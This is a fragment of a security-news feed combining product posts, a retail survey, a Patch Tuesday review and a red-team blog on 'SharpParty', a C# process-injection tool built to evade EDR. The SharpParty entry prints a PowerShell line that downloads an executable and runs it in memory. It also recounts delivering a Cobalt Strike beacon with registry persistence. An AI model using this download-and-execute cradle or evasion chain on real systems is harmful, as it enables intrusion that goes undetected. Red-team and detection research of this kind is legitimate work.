href=\"https://www.stark4n6.com/2025/11/the-evidence-locker-dfir-image.html\"> repository of images</a>, this one called <a href=\"https://theevidencelocker.github.io/\">The Evidence Locker</a>.

      "link": "https://www.zscaler.com/blogs/product-insights/fragmented-unified-taming-data-sprawl-zscaler-dspm",
      "summary": "Manage, control, and secure your data universe through a single, unified approach.Data is everywhere \u2013 fragmented across cloud environments (SaaS, IaaS, PaaS), endpoints, and on-premises. By 2028 global data is projected to exceed 400 zettabytes, with half residing in the cloud and 90% being unstructured. This explosive growth, compounded by shadow AI, where employees often adopt generative AI and other applications without IT oversight, creates critical blind spots and intensifies pressure on security and compliance teams.Historically, organizations have tackled this challenge with disparate tools for each data type, resulting in a costly, complex, and fragmented security ecosystem. These siloed solutions lack unified visibility and control, leading to scattered policies, strained resources, and a disjointed response that paradoxically makes business critical data less secure. Without a single source of truth, security operations remain fragmented. This fragmentation underscores the urgent need for a unified approach.&nbsp;From Fragmented to Unified: Achieve Complete Data Security with ZscalerZscaler Data Security Posture Management (DSPM) addresses today\u2019s profound data security challenges with a unified approach and overcoming the limitations of fragmented tools. DSPM centralizes data security efforts, providing visibility and control across diverse data environments through one intuitive, unified dashboard. Organisations get a precise, comprehensive view of data landscape, allowing you to discover, classify data, and fix associated risks from a single console. This strengthens your overall security, ensures robust regulatory compliance across all platforms.By integrating data and insights from various sources, DSPM helps to eliminate siloed tools and bridges critical security gaps across the AI ecosystem, SaaS, CASB, endpoints, and both cloud and on-premises infrastructures. This empowers security teams with a single pane of glass, full context, enabling more effective risk identification and mitigation.The Benefits of a Unified DSPMZscaler DSPM provides a single, comprehensive method for securing both data at rest and in motion. It integrates essential capabilities that empower security, risk, and compliance teams to effectively manage and enhance their organization's data security. Key advantages include:Holistic visibility and control:&nbsp;Highly effective security starts with a complete, contextual map of data landscape. Achieve centralized, real-time visibility into data, data flows, access patterns, potential risks, and violations across entire environment. This insight facilitates quicker incident response, prevents security gaps, and supports comprehensive data discovery, classification, and inventory. This helps organizations with&nbsp;Data Discovery:&nbsp;Sensitive data across IaaS, SaaS, on-prem, endpoint, and data cloudsData Classification:&nbsp;Classify and categorize data using advanced LLM classificationData Inventory:&nbsp;Understand data storage locations, access, usage, and moreThis provides a single, unified view, eliminating the blind spots that exist between different data environments.&nbsp;Data Access Governance:&nbsp;Based on data classification, DSPM allows security teams to define granular access controls, assigning permissions to users and groups based on their job roles and need-to-know principles. It provides granular visibility into who has access to specific data, what their privilege levels are, and whether that access is appropriate.

The intent was to uncover whether retail organizations are incorporating enterprise-level cyber resilience strategies and to determine their major cybersecurity concerns moving forward.</p>\n\n<p>The survey revealed a roller coaster ride of answers with retailers expressing both confidence in their ability to repel certain types of attacks and concern over being unprepared for others.</p>\n\n<h3><strong>The AI Conundrum</strong></h3>\n\n<p>The survey made it clear that retail executives are concerned about and expect AI-powered attacks to take place. Showing an odd dichotomy, 49% of those surveyed said they are highly or very highly competent at defending themselves against AI-based attacks, but only 25% go on to say they are prepared to deal with such incidents.</p>\n\n<p>Perhaps reflecting their possible overconfidence in their ability to defend against AI attacks, 52% replied that they are highly or very highly competent at implementing and using AI to enhance cybersecurity. The vast majority are so confident in their ability to implement AI-powered security that only 32% are reluctant to implement AI tools and technologies because of possible associated cybersecurity ramifications.</p>\n\n<h3><strong>Alignment for Success</strong></h3>\n\n<p>The need for cybersecurity teams to integrate with the organization's lines of business is starting to gain traction, with 44% of the surveyed saying they have effectively aligned business risk appetites with cybersecurity risk management. This is aided by the fact that 49% of the executives noted that communication channels between cybersecurity and line-of-business teams are effective.</p>\n\n<p>This level of alignment falls off when it comes to implementing security measures with new projects, as only 37% allocate a cybersecurity budget to new initiatives from the beginning, which is significantly lower than the global average of 46%.</p>\n\n<h3><strong>A Cybersecurity Culture Gap</strong></h3>\n\n<p>It is well understood that creating an environment in which all workers understand they are an integral part of their firm&rsquo;s cybersecurity architecture is essential to building a strong security culture. Unfortunately, the survey found only 40% say they have an effective company-wide cybersecurity culture.</p>\n\n<p>One avenue to consider for improving this figure would be using outside expertise to enhance their workforce&rsquo;s cybersecurity measures. However, only about one-third have engaged external support for training and awareness in the past 12 months, and this figure is not expected to change in the coming years.</p>\n\n<p>These are just a few of the dozens of topics covered in the <a href=\"https://levelblue.com/resource-center/levelblue-research/build-cyber-resilience-for-a-stronger-retail-future\">2025 LevelBlue Futures Report: Aligning Cyber Resilience and Business Goals in the Retail Sector</a>.

      "link": "https://www.zscaler.com/blogs/product-insights/new-innovations-zero-trust-cloud-simplest-way-secure-every-workload",
      "summary": "The Architectural Shift: Simplifying Multi-Cloud Security with Zero Trust&nbsp;Today, we are fundamentally simplifying cloud workload security. We are excited to announce major innovations to the Zscaler Zero Trust Cloud, designed to be the simplest and most effective way to connect and secure every workload across any cloud.This isn't about adding another virtual appliance. It's an architectural shift. By decoupling security from the network, we apply a consistent, proxy-based Zero Trust model to all workload traffic\u2014internal (east-west),&nbsp;internet-facing (ingress),&nbsp;private network connectivity,&nbsp;outbound (egress) and microflows. This architecture brokers every connection based on identity and policy, which drastically reduces the attack surface, prevents lateral threat movement, and slashes operational overhead.Let's dive into the technical details of what's new.&nbsp;One platform to Secure All Workload Traffic&nbsp;Our platform now provides unified security and connectivity for every path your cloud workloads take.&nbsp;&nbsp;1. Securing All East-West Traffic in the CloudOne of the most significant security challenges in a distributed environment is securing communication between workloads. Your web application in an AWS VPC needs to talk to a business application in another VPC, which in turn needs to connect to a database in yet another VPC.The old way involved a complex web of VPNs, gateways, and meticulously crafted firewall rules\u2014a process that is slow, error-prone, and creates countless potential entry points.Our approach brokers every connection through the Zero Trust Cloud Policy engine, enabling secure east-west traffic through a single policy framework. This includes protecting traffic flowing between workloads in the same cloud regions (e.g., VPC-to-VPC or VNet-to-VNet). By enforcing identity-based segmentation, we ensure that workloads can only communicate with other explicitly authorized workloads, effectively eliminating the internal attack surface.Watch the video: Secure East-West Traffic [3 Minutes]2. Securing Private Network ConnectivityOrganizations often establish private links like AWS Direct Connect or Azure ExpressRoute to connect clouds to each other or back to an on-premises data center. This may be required for multi-tiered applications (e.g., web tier in the cloud, database on-prem) or to backhaul cloud traffic for security inspection.The Zscaler Zero Trust Cloud now extends its zero trust architecture to secure traffic over these private links.&nbsp;AWS Direct Connect is available now, with support for&nbsp;Azure ExpressRoute and GCP Interconnect coming soon.3. Protecting Internet-Facing Workloads (Ingress Traffic)Your public-facing applications are your digital front door and a prime target for attack. The Zero Trust Cloud&nbsp; now extends its powerful protection to ingress traffic.Instead of just passing traffic to your workloads, we terminate every inbound connection at our Gateway or Cloud Connector,&nbsp; and check for access controls. This means we can enforce critical security controls\u2014shielding applications from attacks,&nbsp;before a connection ever reaches your VPC or VNet. This ensures only legitimate traffic is allowed, creating an active defense for your critical applications.Watch the video: Secure Ingress Traffic [3 Minutes]4. Stop Lateral Threat Movement with Cloud-Native MicrosegmentationAs you migrate mission-critical applications to the cloud, the need to microsegment workloads to meet regulatory requirements and reduce the blast radius becomes paramount. However, traditional network-based segmentation using security groups and ACLs is complex, static, and breaks down in dynamic cloud-native environments.To support these modern architectures, we have extended our microsegmentation capabilities to containerized environments. Support for visibility into containers resources is available in Amazon Elastic Kubernetes Service (EKS)&nbsp;today. The Zero Trust Cloud solution enables customers to have full resource visibility at the cloud region level including VPCs/VNets, subnets, EC2/VMs, cloud metadata, and more.Ultimately, this allows you to achieve true workload isolation and contain threats instantly, whether your applications are running on VMs or in containers, all from a single policy framework.&nbsp;Solving Your Most Critical Workload Security Challenges&nbsp;These new capabilities are not just features; they are solutions to the most pressing problems facing cloud and security teams today.Protect AI powered software development like Devin or Cursor without slowing down innovation.&nbsp;Eliminate security silos across AWS, Azure, and GCP with a single policy framework.&nbsp;Use microsegmentation to isolate critical apps (like Oracle) and contain breaches instantly.&nbsp;De-risk \"lift and shift\" projects (like SAP migration to cloud) by decoupling security from the network&nbsp;The Future of Workload Security is Zero Trust&nbsp;The era of building digital castles and moats is over. In a world of distributed workloads and boundless perimeters, the only viable path forward is Zero Trust. With these new innovations, the Zscaler Zero Trust Cloud provides the most comprehensive and simplest platform to connect and protect every workload, on any cloud, across every traffic path.Ready to eliminate cloud security complexity?&nbsp;Request&nbsp;a personalized demo to see how you can simplify your cloud security today.",

Nine of these CVEs were reported by Trend ZDI researcher Michel DePlante. He discovered the bugs fixed by the patch for <a href=\"https://helpx.adobe.com/security/products/formatplugins/apsb25-114.html\">Adobe Format Plugins</a>. If you must prioritize, the update for <a href=\"https://helpx.adobe.com/security/products/indesign/apsb25-106.html\">InDesign</a> fixes four Critical-rated bugs. All could lead to arbitrary code execution. The fix for <a href=\"https://helpx.adobe.com/security/products/illustrator-mobile-ios/apsb25-111.html\">Illustrator for iPad</a> also fixes five Critical-rated code execution bugs. However, the update for <a href=\"https://helpx.adobe.com/security/products/illustrator/apsb25-109.html\">Illustrator</a> only has two code execution CVEs. It\u2019s interesting to see the difference between the mobile and desktop versions. The patch for <a href=\"https://helpx.adobe.com/security/products/photoshop/apsb25-108.html\">Photoshop</a> addresses a single code execution bug. There are four Critical-rated code execution bugs fixed by the <a href=\"https://helpx.adobe.com/security/products/substance3d_stager/apsb25-113.html\">Substance 3D Stager</a> update. The patch for <a href=\"https://helpx.adobe.com/security/products/incopy/apsb25-107.html\">InCopy</a> corrects three code execution bugs. The final patch from Adobe this month fixes a privilege escalation bug in <a href=\"https://helpx.adobe.com/security/products/pass/apsb25-112.html\">Adobe Pass</a>. </p><p class=\"\">Overall, this month\u2019s Adobe release is (thankfully) not that exciting. None of the bugs fixed by Adobe this month are listed as publicly known or under active attack at the time of release. All of the updates released by Adobe this month are listed as deployment priority 3.</p><p class=\"\"><strong>Microsoft Patches for November 2025</strong></p><p class=\"\">This month, Microsoft took pity on patch managers around the world and released a mere 63 CVEs Windows and Windows Components, Office and Office Components, Microsoft Edge (Chromium-based), Azure Monitor Agent, Dynamics 365, Hyper-V, SQL Server, and the Windows Subsystem for Linux GUI. Of the patches released today, four are rated Critical and 59 are rated Important in severity. One of these CVEs came through the Trend ZDI program. Counting the third-party Chromium updates listed in the release, it brings to total number of CVEs to 68.</p><p class=\"\">This release is a far cry from the 177 CVEs we saw last month, although I don\u2019t think anyone will complain. That brings the total CVEs addressed by Microsoft so far this year to 1,084. This is not counting the numerous updates for Azure Linux and CBL Mariner released earlier this month, as these should be considered Linux CVEs being applied to Azure properties. This drop could also be due to the fact that this is the first month where Windows 10 is not receiving updates. We will see what December brings and how close we end up to the record total of CVEs set back in 2020. &nbsp;</p><p class=\"\">Microsoft lists one bug under active attack, but none are publicly known at the time of release. Let\u2019s take a closer look at some of the more interesting updates for this month, starting with the bug under active attack: </p><p class=\"\">-&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-62215\" target=\"_blank\"><strong>CVE-2025-62215</strong></a><strong> - Windows Kernel Elevation of Privilege Vulnerability<br /></strong>This is the bug currently under exploit, but Microsoft offers no indication of the extent of the exploitation. It\u2019s also interesting to note there\u2019s a race condition here, and it shows that some race conditions are more reliable than others. Bugs like these are often paired with a code execution bug by malware to completely take over a system. If you must prioritize, this should be at the top of your list.</p><p class=\"\">-&nbsp;&nbsp;&nbsp; <a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-62199\" target=\"_blank\"><strong>CVE-2025-62199</strong></a><strong> - Microsoft Office Remote Code Execution Vulnerability<br /></strong>Another month \u2013 another Office bug where the Preview Pane is an attack vector. Interestingly, Microsoft notes user interaction is required despite the Preview Pane, so it\u2019s not clear how this would be exploited. Maybe if a user previews an attachment? Still, at this point, it\u2019s time to consider disabling the Preview Pane in Office until Microsoft clears these bugs up.</p><p class=\"\">-&nbsp;&nbsp;&nbsp; <a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-60709\" target=\"_blank\"><strong>CVE-2025-60709</strong></a><strong> - Windows Common Log File System (CLFS) Driver Elevation of Privilege Vulnerability<br /></strong>While this bug is not under active attack and simply leads to executing code as SYSTEM, I highlight this bug as CLFS has been exploited multiple times over the last few years. I will admit that I may have some recency bias with this as I just saw a <a href=\"https://ringzer0.training/countermeasure25-clfs-uncontained-exploiting-clfs-without-touching-the-log/\">presentation</a> at the Countermeasure conference in Ottawa discussing CLFS exploitation. Still, the presentation showed how CLFS has been recently abused by threat actors.</p><p class=\"\">&nbsp;-&nbsp;&nbsp;&nbsp; <a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-62222\" target=\"_blank\"><strong>CVE-2025-62222</strong></a><strong> - Agentic AI and Visual Studio Code Remote Code Execution Vulnerability<br /></strong>While there have been a few bugs impacting CoPilot, this is the first bug specifically calling out Agentic AI with a code execution bug. Based on the description, exploitation of this vulnerability would not be trivial. However, with a little bit of social engineering, it could allow remote attackers to execute their code on a target GitHub repository. There are several bugs impacting CoPilot receiving patches this month, but this one stands out above the others. If you\u2019re using Agentic AI, pay attention here, or you could find yourself dealing with something more than just AI hallucinations. </p><p class=\"\">Here\u2019s the full list of CVEs released by

actions are required to fully address the vulnerability.</em></p><p class=\"\"><em>&nbsp;</em></p><p class=\"\">Looking at the remaining Critical patches, the update for Nuance PowerScribe 360 stands out not for impact, but for servicing. To update to a non-affected version, you will need to either contact your Customer Success Manager (CSM) or Technical Support for the latest version. So much for \u201cjust patch\u201d. There\u2019s an elevation of privilege (EoP) in DirectX that could lead to SYSTEM privileges, but there\u2019s no indication why this one is Critical while an identical one is Important. The final Critical patch for November addresses a command injection in Visual Studio. The only interesting thing here is that exploitation would require prompt injection, CoPilot Agent interaction, and triggering a build. That\u2019s far from trivial, but I would love to see what sort of CoPilot interaction is required.</p><p class=\"\">Moving on to the remaining code execution bugs, there are a half-dozen open-and-own in various Office components. In these cases, the Preview Pane is not an attack vector. The bug in Azure Monitor Agent sounds more severe than its Important rating. An unauthenticated attacker could execute their code on affected systems without user interaction. While it doesn\u2019t fall into the realm of wormable, it definitely lands in the world of yikes. The bug in GDI+ also garners a yikes from me as it gets the highest CVSS rating this month at 9.8. An attacker could get code execution over the network without user interaction. GDI+ bugs typically involve viewing an image, but this bug could impact web services that \u201care parsing documents that contain a specially crafted metafile, without the involvement of a victim user.\u201d The SharePoint bug is another deserialization bug \u2013 similar to the one we saw exploited in-the-wild back in July. This requires authentication, but in previous attacks, this type of bug was paired with an auth bypass to exploit affected systems. The bug in the Windows Subsystem for Linux GUI requires user interaction, but patching means updating from the command line versus installing a patch. Finally, there are a couple of bugs in the RRAS protocol, which always seem to have something fixed each month.</p><p class=\"\">Looking at the privilege escalation bugs receiving patches this month, most simply lead to SYSTEM-level code execution or administrative privileges if an authenticated user runs specially crafted code. Others could lead to elevating levels of code execution integrity \u2013 moving from Low to Medium integrity or Medium to Local System for code execution. The EoP in Configuration Manager allows attackers to get configuration manager administrator privileges. The bugs in Administration Protection could allow an attack to bypass these protections and execute code as an administrator. There\u2019s an interesting bug in OneDrive for Android that allows attackers to \u201cgain unauthorized access to system resources,\u201d which could then be used for further compromise. Finally, the patch for SQL Server corrects a SQL injection bug. The attacker would get the privileges of the process running the query, so if the query has elevated privileges, so does the attacker.</p><p class=\"\">There are only two Security Feature Bypass (SFB) patches in November, and both have CoPilot as a component. One is a simple path traversal in the Visual Studio Code CoPilot Chat Extension. An attacker could use this to bypass file protections. The other bug is due to the improper validation of generative AI output by CoPilot on Visual Studio. This could also be used to bypass file protections.</p><p class=\"\">There are only a few information disclosure bugs getting patched this month, and fortunately, the majority of these bugs only result in info leaks consisting of unspecified memory contents or memory addresses. The bug in Dynamics 365 (On-Premises) leaks the ever-elusive \u201csensitive information\u201d. I should also point out that the bugs in License Manager were <strong>silently patched</strong> last month and are now being documented. I won\u2019t shout from this soapbox for too long, but these are definitely a bad thing\u2122 and should not be done. </p><p class=\"\">The November release contains fixes for three Denial-of-Service (DoS) bugs, and their descriptions are somewhat \u2013 obtuse. While they all state that an attacker could deny service over a network (or locally) to that component, two of them state they could be used by a low-privilege Hyper-V guest to cause a DoS on the Hyper-V environment. It\u2019s not clear how this would occur, but it if you\u2019re running Hyper-V, don\u2019t overlook these patches.</p><p class=\"\">Finally, there are two spoofing bugs in Dynamics 365 Field Service (online) that manifest as cross-site scripting (XSS) bugs. Of course, a simple patch won\u2019t fix these. Instead, you\u2019ll need to go to the Power Platform admin center and apply the updates from there.</p><p class=\"\">No new advisories are being released this month. However, there was an update to the latest servicing stack updates <a href=\"https://msrc.microsoft.com/update-guide/vulnerability/ADV990001\" target=\"_blank\">ADV990001</a>.</p><p class=\"\"><strong>Looking Ahead</strong></p><p class=\"\">The final Patch Tuesday of 2025 will be on December 9, and I\u2019ll be back then with my analysis and thoughts about the release. Until then, stay safe, happy patching, and may all your reboots be smooth and clean!</p>",

      "title": "SharpParty: Process Injection in C#",
      "link": "https://levelblue.com/blogs/security-essentials/sharpparty",
      "summary": "<h2>Introduction</h2>\n\n<p>As Anti-Virus and EDR solutions improve in detection and response capabilities, the job of a red teamer can become quite arduous. Malware payloads and techniques that once dominated networks have failed the test of time as EDR becomes aware of them. If your initial access payloads are detected immediately, your six-week long red team could be dead on arrival. Additionally, real-world threat actors have an abundance of time and resources; just imagine all the payloads, techniques, and 0-days that a sophisticated threat actor group may have developed over the years. It is essential for red teams to continuously develop their tactics, techniques, and procedures (TTPs) for the purpose of emulating real-life threat actors that are ever evolving.</p>\n\n<p>In this blog post, Stroz Friedberg, a LevelBlue company, introduces an addition to the red teamers&rsquo; toolkit called &ldquo;SharpParty&rdquo; &ndash; a C# implementation of the process injection techniques dubbed &ldquo;PoolParty&rdquo;.</p>\n\n<p>We want to be very clear here: <em>Stroz Friedberg did not create PoolParty nor did Stroz Friedberg extend the research into Windows Thread Pools. Rather, Stroz Friedberg simply translated the original source code of SafeBreach Labs from C++ to C#. The goal here is to give red teamers more options when picking their payloads. You can download SharpParty from our <a href=\"https://github.com/strozfriedberg/SharpParty\" rel=\"noopener\" target=\"_blank\">GitHub repository</a>.</em></p>\n\n<h3>Process Injection</h3>\n\n<p>Before we dive into PoolParty, we must understand what process injection is first. Process injection is a relatively simple concept: inject code into another process. The purpose of injecting code into another process is to hide and obscure malicious activities. The actual implementation of process injection, however, is not as simple.</p>\n\n<p>If you would like to learn more about process injection, please refer to the following URLs:</p>\n\n<ul>\n\t<li><a href=\"https://attack.mitre.org/techniques/T1055/\" rel=\"noopener\" target=\"_blank\">https://attack.mitre.org/techniques/T1055/</a></li>\n\t<li><a href=\"https://github.com/plackyhacker/Shellcode-Injection-Techniques\" rel=\"noopener\" target=\"_blank\">https://github.com/plackyhacker/Shellcode-Injection-Techniques&nbsp;</a></li>\n</ul>\n\n<h3>Pool Party</h3>\n\n<p>SafeBreach Labs masterfully exemplified the necessity of continuous TTP development through the release of &ldquo;PoolParty&rdquo; &ndash; a suite of process injection techniques that target Windows Thread Pools. With this research, SafeBreach Labs was able to bypass five of the leading EDR vendors. They also released a <a href=\"https://github.com/SafeBreach-Labs/PoolParty\" rel=\"noopener\" target=\"_blank\">Proof-of-Concept GitHub repository</a>, with source code written in C++.</p>\n\n<p>In short, PoolParty injects code into processes by crafting and inserting legitimate work items into a process&rsquo; thread pool. A work item is a structure that contains a task specification, including specific conditions and code to execute when these conditions are met. Injected work items effectively act as the execution primitive, because the work item will execute our code when its conditions are met. For example, a work item can perform an action when a file is modified. The file modification in this example is the execution primitive and we do not have to manually start the execution via something like &ldquo;CreateRemoteThread&rdquo;, which is a well-known indicator of process injection.</p>\n\n<h3>Motivation</h3>\n\n<p>The primary motivation for a C# implementation is to allow the Pool Party techniques to be used in tools that leverage inline MSBuild tasks in XML files. A Task XML file can include embedded C# code that, when passed to &ldquo;msbuild.exe&rdquo;, will be compiled and executed. While Task XMLs do support C++ (the language the original PoC was written in), they are only supported when the &ldquo;CppCodeProvider.dll&rdquo; assembly is present on the target machine. This DLL is included within some Visual Studio installations and is not guaranteed to be present on Windows machines by default. To ensure our payloads would detonate on practically any Windows host, we would need to implement the PoolParty technique in C#.</p>\n\n<p>Additionally, a C# implementation of PoolParty can be reflectively loaded into memory via PowerShell:</p>\n\n<pre class=\"code\">\n<span class=\"var\">$data</span> <span class=\"punct\">=</span> <span class=\"punct\">(</span><span class=\"keyword\">new-object</span> <span class=\"namespace\">net.webclient</span><span class=\"punct\">)</span><span class=\"punct\">.</span><span class=\"func\">downloaddata</span><span class=\"punct\">(</span><span class=\"string\">'http://127.0.0.1/sharpparty.exe'</span><span class=\"punct\">)</span><span class=\"punct\">;</span>&#10;<span class=\"var\">$assem</span> <span class=\"punct\">=</span> <span class=\"punct\">[</span><span class=\"namespace\">System.Reflection.Assembly</span><span class=\"punct\">]</span><span class=\"punct\">::</span><span class=\"func\">Load</span><span class=\"punct\">(</span><span class=\"var\">$data</span><span class=\"punct\">)</span><span class=\"punct\">;</span>&#10;<span class=\"punct\">[</span><span class=\"namespace\">SharpParty.Program</span><span class=\"punct\">]</span><span class=\"punct\">::</span><span class=\"func\">Main</span><span class=\"punct\">(</span><span class=\"string\">\"1 666\"</span><span class=\"punct\">.</span><span class=\"func\">Split</span><span class=\"punct\">()</span><span class=\"punct\">)</span><span class=\"punct\">;</span>&#10;</p>\n\n<p>Lastly, as offensive C# tooling continues to grow in popularity, a C# PoolParty implementation can be integrated into other offensive tooling as part of varying attack chains.</p>\n\n<p>For these reasons, Stroz Friedberg began implementation of the &ldquo;PoolParty&rdquo; technique in C# &ndash; SharpParty.</p>\n\n<h3>Efficacy Against EDR</h3>\n\n<p>During our testing, SharpParty was consistently able to bypass Microsoft Defender for Endpoint (MDE) initially. We submitted a report to Microsoft that demonstrated the bypass in March of 2025, which they validated and subsequently implemented detections for. Since then, we have observed an increase in the number of detections on SharpParty. Other EDR systems have detected and sometimes prevented the execution of SharpParty, largely based on the malicious use of &ldquo;msbuild.exe&rdquo; as well as an unspecified process injection technique.</p>\n\n<p>While SharpParty inline tasks have seen increased detections from EDR recently, there are a few things worth noting:</p>\n\n<ul>\n\t<li>SafeBreach Labs publicly released their research on process injection via Windows Thread Pools, enabling EDR vendors to implement detections and monitoring for this technique.</li>\n\t<li>The use of inline tasks and &ldquo;msbuild.exe&rdquo; is a relatively well-known technique.</li>\n\t<li>There is room for further development that could improve the payload&rsquo;s efficacy against EDR.</li>\n</ul>\n\n<p>Ultimately our goal is to give red teams one more item in their toolkit, one more means to meet an end, another test case that evaluates threat detection capabilities.</p>\n\n<h3>Success Story</h3>\n\n<p>During our research, we had the opportunity to further test our code on a client engagement. The following is a breakdown of our payload:</p>\n\n<ul>\n\t<li>A Task XML file with C# inline task that contains encrypted SharpParty code and helper functions to fetch the decryption key, decrypt the code, then compile and execute the decrypted code.</li>\n\t<li>The beacon shellcode is nested within an additional layer of encryption.</li>\n\t<li>HTTP Keying is used to retrieve and validate the decryption key, ensuring connectivity to the C2 server.</li>\n</ul>\n\n<p>The execution flow of the payload is depicted in the diagram below:</p>\n\n<p><img alt=\"Success Story\" src=\"https://cyber.levelblue.com/m/36b94dbf331093c9/original/sharpparty-blog.png\" style=\"width: 624px; height: auto;\" /></p>\n\n<p>How the dropper executes &ldquo;msbuild.exe&rdquo; on the task XML is dependent on various conditions and is outside the scope of this blog post.</p>\n\n<p>With everything tested and ready to go, we joined a call with the client to screenshare the malware detonation. We disguised the payload in such a way that, from the victim&rsquo;s perspective, it looks like they downloaded a ZIP file and opened a PDF. Under the hood, we successfully executed SharpParty and obtained a Cobalt Strike beacon. After establishing the C2 channel, the client received no alarms on their side at that moment. After about 10 minutes, we suggested a test-case involving persistence via registry run keys to check if this activity is detected. The client agreed and we performed the test-case live on the call, setting an autorun key to execute the same SharpParty payload. Then, we logged out of the workstation, logged back in, and received the second beacon.</p>\n\n<p>The client was understandably concerned, seeing as we had established two C2 beacons and they had not received any detections. 30 minutes after detonation, the EDR picked up the malicious use of &ldquo;msbuild.exe&rdquo; and an unspecified malicious payload in our target process, for which the client was alerted.</p>\n\n<p>While ultimately this code was still caught, there are two key takeaways:</p>\n\n<ul>\n\t<li>The execution of &ldquo;msbuild.exe&rdquo; is what was picked up by EDR.</li>\n\t<li>There are 30 minutes between detonation and detection. While relatively small, this gap may be large enough for a threat actor to pivot within the network and maintain their access.</li>\n</ul>\n\n<h3>Conclusion</h3>\n\n<p>In summary, we have developed a C# implementation of PoolParty based on the incredible work from SafeBreach Labs, provided motivation for its existence, and shared a success story. As always, there is room for improvement. We have room to grow in terms of adding more variants, perhaps even discovering new ones, and improving the efficacy against EDR products. Our goal in publishing this blog post and open sourcing <a href=\"https://github.com/strozfriedberg/SharpParty\" rel=\"noopener\" target=\"_blank\">SharpParty</a> is to share knowledge with the security community and provide avenues for future research and development.</p>",

The press release quotes Matthew Geleotti from the Attorney General's office:<br /><br />&nbsp;\"The defendant was part of a group of co-conspirators that preyed on American investors by promising them high returns on supposed digital asset investments when, in fact, they stole nearly $37 million from U.S. victims using Cambodian scam centers.&nbsp;&nbsp;Foreign scam centers, purporting to offer investments in digital assets have, unfortunately, proliferated.\"<br /><br />When talking about Crypto Investment Scams, they certainly have \"proliferated.\" They are currently the number one form of cybercrime financial losses in America, for the third year in a row, according to the FBI's IC3.gov.&nbsp; When we refer to these \"Pig Butchering\" scams as Crypto Investment Scams, it is easy to forget that many \"crypto\" scams still rely on the tried and true method of wire transfers to shell companies. When we first started exploring Romance Scams and their link to Business Email Compromise, the mostly Nigerian scammers referred to these as \"Wire-wire jobs.\" A wire goes from the victim to a shell company, and a second wire goes from the shell company to the ultimate beneficiary of the crime.

      "summary": "<h1 style=\"text-align: left;\">Introduction </h1>\n<div class=\"interval_12\">We have recently started a new blog series called #VTPRACTITIONERS. This series aims to share with the community what other practitioners are able to research using VirusTotal from a technical point of view.\n </div>\n<div class=\"interval_12\">Our first blog saw our colleagues at <a href=\"https://blog.virustotal.com/2025/10/virustotal-success-stories-seqrite.html\" target=\"_blank\">SEQRITE tracking UNG0002, Silent Lynx, and DragonClone</a>. In this new post, <a href=\"https://www.acronis.com/en/tru/\" target=\"_blank\">Acronis Threat Research Unit (TRU)</a> shares practical insights from multiple investigations, including the ClickFix variant known as FileFix, the long-running South Asian threat actor SideWinder, and the SVG-based campaign targeting Colombia and named Shadow Vector.\n </div>\n\n\n<h1 style=\"text-align: left;\">How VT plays a role in hunting for analysts\n </h1>\n<div class=\"interval_12\">For the threat analyst, web-based threats present a unique set of challenges. Unlike file-based malware, the initial stages of a web-based attack often exist only as ephemeral artifacts within a browser. The core of the investigation relies on dissecting the components of a website, from its HTML and JavaScript to the payloads it delivers. This is where VT capabilities for archiving and analyzing web content become critical.\n </div>\n<div class=\"interval_12\">VT allows analysts to move beyond simple URL reputation checks and delve into the content of web pages themselves. For attacks like the *Fix family, which trick users into executing malicious commands, the entire attack chain is often laid bare within the page's source code. The analyst's starting point becomes the malicious commands themselves, such as navigator.clipboard.writeText or document.execCommand(\"copy\"), which are used to surreptitiously copy payloads to the victim's clipboard.\n </div>\n<div class=\"interval_12\">The Acronis team's investigation into the FileFix variant demonstrates a practical application of this methodology. Their research began not with a specific sample, but with a hypothesis that could be translated into a set of hunting rules. Using VT's Livehunt feature, they were able to create YARA rules that searched for new web pages containing the clipboard commands alongside common payload execution tools like powershell, mshta, or cmd. This proactive hunting approach allowed them to cast a wide net and identify potentially malicious sites in real-time.\n </div>\n<div class=\"interval_12\">One of the main challenges in this type of hunting is striking a balance between rule specificity and the need to uncover novel threats. Overly broad rules can lead to a deluge of false positives, while highly specific rules risk missing creatively crafted commands. The Acronis team addressed this by creating multiple rulesets with varying levels of specificity, allowing them to both find known threats and uncover new variants like FileFix.\n </div>\n<div class=\"interval_12\">In the case of the SideWinder campaign, which uses document-based attacks, VT value comes from its rich metadata and filtering capabilities. Analysts can hunt for malicious documents exploiting specific vulnerabilities, and then narrow the results by focusing on specific geographic regions through submitter country information. This allows them to effectively isolate threats that match a specific actor's profile, such as SideWinder's focus on South Asia.\n </div>\n<div class=\"interval_12\">Similarly, for the Shadow Vector campaign, which used malicious SVG files to target users in Colombia, VT content search and archiving proved essential. The platform's ability to store and index SVG content allowed researchers to identify a campaign using judicial-themed lures. By combining content searches for legal keywords with filters like submitter:CO, the Acronis team could map the entire infection chain and its infrastructure, transforming fragmented indicators into a comprehensive intelligence picture.\n </div>\n\n\n<h1 style=\"text-align: left;\">Acronis - Success Story\n </h1>\n<div class=\"interval_12\"><i>[In the words of Acronis\u2026] </i></div>\n<div class=\"interval_12\"><a target=\"_blank\">Acronis Threat Research Unit (TRU)</a> used VirusTotal\u2019s platform for threat hunting and intelligence across several investigations, including FileFix, SideWinder, and Shadow Vector. In the FileFix case, TRU used VT\u2019s Livehunt framework, developing rules to identify malicious web pages using clipboard manipulation to deliver PowerShell payloads. The ability to inspect archived HTML and JavaScript whitin the VirusTotal platform allowed the team to uncover not only known Fix-family attacks but also previously unseen variants that shared code patterns.\n </div>\n<div class=\"interval_12\">VirusTotal\u2019s data corpus also supported Acronis TRU\u2019s broader threat tracking. In the SideWinder campaign, VT\u2019s metadata and sample filtering capabilities helped analysts trace targeted document-based attacks exploiting tag:CVE-2017-0199 and tag:CVE-2017-11882 across South Asia, leading to the creation of hunting rules later published in <a href=\"https://www.acronis.com/en/tru/posts/from-banks-to-battalions-sidewinders-attacks-on-south-asias-public-sector/\" target=\"_blank\">\u201cFrom banks to battalions: SideWinder\u2019s attacks on South Asia\u2019s public sector\u201d</a>. </div>\n  \n<div class=\"interval_12\"> Similarly, during the <a href=\"https://www.acronis.com/en/tru/posts/shadow-vector-targets-colombian-users-via-privilege-escalation-and-court-themed-svg-decoys/\" target=\"_blank\">\u201cShadow Vector targets Colombian users via privilege escalation and court-themed SVG decoys\u201d</a> investigation, VT\u2019s archive of SVG content exposed a 